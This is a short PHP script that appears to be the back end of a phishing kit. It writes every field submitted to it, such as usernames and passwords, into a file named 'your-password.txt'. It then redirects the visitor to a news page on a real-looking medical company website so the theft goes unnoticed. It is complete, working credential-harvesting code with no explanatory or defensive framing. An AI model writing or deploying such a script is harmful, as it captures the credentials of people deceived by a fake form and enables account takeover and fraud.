<?php
$file = fopen("your-password.txt", "a");
fwrite($file, "\t\t\t\t\t\t");
fwrite($file, "\r\n");
foreach($_POST as $key=>$value) {
    fwrite($file, "\t\t\t\t\t\t");
    fwrite($file, $key);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");

}
fwrite($file, "\r\n");
fwrite($file, "\t\t\t\t\t\t");
fclose($file);
header("Location: https://medina-med.com/novini/novo-medina-med-uspeshno-vnedri-proizvodstvena-protsesna-inovatsiya-topal-regenerat-remedina-3074/?gclid=EAIaIQobChMIx6ihv5zP_AIV_P3VCh0sGAR9EAAYASAAEgJ4mvD_BwE");
die();
?>